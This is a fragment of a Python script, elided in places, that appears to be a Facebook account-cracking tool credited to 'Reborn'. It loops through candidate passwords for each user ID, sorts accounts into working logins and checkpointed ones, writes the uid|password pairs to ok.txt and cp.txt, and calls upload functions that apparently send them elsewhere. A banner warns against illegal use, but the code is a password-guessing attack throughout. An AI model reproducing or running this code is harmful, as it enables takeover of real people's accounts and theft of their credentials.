...
class Main:
 ...
 > \033[0;92mDEVELOPER     : Reborn
 > \033[0;95mFACEBOOK ID   : Khan kijana
 ...
 > \033[0;97mWARNING       : DONT USE FOR ILLEGAL WORK     
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [RRSB] : %s/%s -> \033[0;92m [ RBL-OK:%s ]- \033[0;93m[RBL-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[RBL-OK😍] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [RBL-OK😍] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[RBL-CP😭] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [RBL-CP😭] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
